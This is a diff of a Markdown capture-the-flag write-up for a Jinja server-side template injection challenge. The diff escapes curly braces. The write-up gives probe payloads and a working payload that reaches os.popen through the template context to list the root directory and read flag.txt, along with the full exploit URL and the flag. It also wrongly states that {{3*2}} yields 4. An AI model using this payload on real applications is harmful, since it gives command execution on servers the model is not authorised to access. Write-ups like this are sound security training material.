@@ -133,10 +133,10 @@ On going to https://babyssti.crhc.club/dms, we find the text `hello None`. I tri
 Eg. `https://babyssti.crhc.club/dms?key=mew` gives `hello mew`.
 
 Since the chall name has ssti, we check if the payload like ```{{3*2}}``` gives the output 4. It does hence ssti works.\
-We can try using this payload ```{{'test'[::-1]}}``` to check if it's jinja based (it works).\
+We can try using this payload ```\{\{'test'[::-1]\}\}``` to check if it's jinja based (it works).\
 
-The flag is present in the root (confirm using payload ```{{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls /').read() }}``` ). \
-We can get the flag using ```https://babyssti.crhc.club/dms?key={{%20self._TemplateReference__context.cycler.__init__.__globals__[%27os%27].popen(%27cat%20/flag.txt%27).read()%20}}```
+The flag is present in the root (confirm using payload ```\{\{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls /').read() \}\}``` ). \
+We can get the flag using ```https://babyssti.crhc.club/dms?key=\{\{%20self._TemplateReference__context.cycler.__init__.__globals__[%27os%27].popen(%27cat%20/flag.txt%27).read()%20\}\}```
 
 **Flag:** CRHC{w0w_u_rc3_m3_s0_34si1y_b89ew32f47r2}
 
